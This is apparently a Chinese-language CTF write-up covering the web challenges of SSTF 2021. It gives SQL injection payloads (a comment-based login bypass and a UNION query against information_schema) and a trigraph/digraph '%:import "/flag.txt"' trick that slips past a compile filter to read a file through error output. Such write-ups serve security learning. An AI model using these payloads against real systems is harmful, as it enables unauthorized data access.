# Flag Submission

`SCTF{It_15_tim3_t0_hack!!}`



# SQLi 101

```
?id=admin'%23&pw=1
```



# SQLi 102

```
?searchkey=-1'union select 1,group_concat(column_name),3,4,5,6,7,8 from information_schema.columns  where table_name = 'findme'  %23
```

​	

# SW Expert Academy

一道离谱的题目，输入C程序然后会运行：

```shell
 $ gcc -o binary code.c -std=c99
```



f12告诉了flag在`/flag.txt`里面。然后ban了很多东西，没法命令执行和文件读取。GG。



这里利用了文件导入，或者说头文件叭。一般只想到`include`，但是`include`和`#`都被ban了，分别绕过。

绕过`include`用`import`：

> \#import指令用于从一个类型库中结合信息。该类型库的内容被转换为C++类,主要用于描述COM界面。
>
> 语法
>
> \#import "文件名" [属性]
>
> \#import <文件名> [属性]

gcc既能c，也能c++，所以import可以用。

`#`的绕过就用了一个非常离谱的东西，参考链接：

https://en.wikipedia.org/wiki/Digraphs_and_trigraphs



用`??=`或者`%:`来替换成`#`。

所以这样都可以：

```c++
??=import "/flag.txt"
%:import "/flag.txt"
```

利用报错的信息来得到flag：

![image-20210817235357923](Hacker's-Playground(SSTF)-2021-Web.assets/image-20210817235357923.png)



# Poxe Center

没做出来。是个postgre的SQL注入，最后没找到flag在哪。

暂时记到这里，这题等WP再复现了，看看flag到底在哪。
